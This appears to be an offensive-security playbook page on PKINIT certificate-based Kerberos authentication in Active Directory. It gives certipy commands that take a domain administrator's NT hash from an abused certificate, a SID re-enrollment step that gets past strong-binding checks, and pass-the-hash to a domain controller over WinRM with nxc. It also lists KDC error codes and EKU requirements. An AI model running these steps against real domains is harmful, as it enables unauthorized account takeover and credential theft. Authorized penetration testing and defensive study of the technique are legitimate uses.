# PKINIT (Certificate-based Kerberos Auth)

## When this applies

- You hold a valid client certificate (`.pfx`) for an AD user (e.g., obtained via ADCS abuse, shadow credentials, ESC1/4/etc.).
- The DC's KDC has the PKINIT module enabled and the issuing CA in NTAuth store.
- Goal: authenticate as the cert's subject and obtain TGT/NT hash.

## Technique

The client cert authenticates to the KDC via PKINIT (PA-PK-AS-REQ). On success, the KDC returns a TGT and `certipy auth` extracts the NT hash from the PAC for downstream PtH use.

## Steps

```bash
# Standard PKINIT auth — produces NT hash + ccache for the cert's UPN
certipy auth -pfx admin.pfx -dc-ip DC_IP

# When SID strong-binding enforcement is on and the cert lacks a SID extension:
certipy req ... -upn Administrator@domain -sid S-1-5-21-...-500
# (re-enroll with target SID embedded; required for May 2022+ patched DCs)

# Modern KDC requires SID extension — if `certipy auth` fails with
#   `Object SID mismatch between certificate and user`,
# re-enroll with -sid pointing at the target's actual AD SID.
# Look up target SID first (LDAP query or impacket lookupsid.py).
```

## Verifying success

- `certipy auth` prints the NT hash and writes a `.ccache` for the principal.
- Use the NT hash with `nxc winrm DC -u Administrator -H <NT_hash>` for PtH.

## Common pitfalls

When PKINIT fails — pivot to Schannel via `certipy-ldap-shell-fallback.md`. Symptoms that indicate PKINIT is unusable:

- `KDC_ERR_PADATA_TYPE_NOSUPP` — PKINIT package not enabled on this DC
- `KDC_ERR_CERTIFICATE_MISMATCH` — strong-binding SID enforcement
- `KDC_ERR_INCONSISTENT_KEY_PURPOSE` — cert EKU not Client Auth-capable
- `KDC_ERR_CLIENT_NOT_TRUSTED` — DC's NTAuth store doesn't include this CA
- ASN1 / IO timeouts during AS-REQ — DC PKINIT module disabled or NTLM-only

EKU requirements:

- Client Authentication (1.3.6.1.5.5.7.3.2): PKINIT ✓, Schannel ✓
- Smart Card Logon (1.3.6.1.4.1.311.20.2.2): PKINIT ✓
- Any Purpose (2.5.29.37.0): PKINIT ✓, Schannel ✓
- Server Authentication ONLY (1.3.6.1.5.5.7.3.1): PKINIT ✗, Schannel ✗ → DEAD END

If template has ENROLLEE_SUPPLIES_SUBJECT but only Server Auth EKU:
`certipy auth -pfx cert.pfx` → KDC_ERR_INCONSISTENT_KEY_PURPOSE
Schannel LDAPS → bind returns None, operations fail with "bind must be completed"

Check EKU before investing in PKINIT: `certipy find -vulnerable -stdout`. `msPKI-Certificate-Application-Policy` (v2 templates) overrides `pKIExtendedKeyUsage`.

## Tools

- certipy
- impacket `getTGT.py` (with `-cert-pfx`)
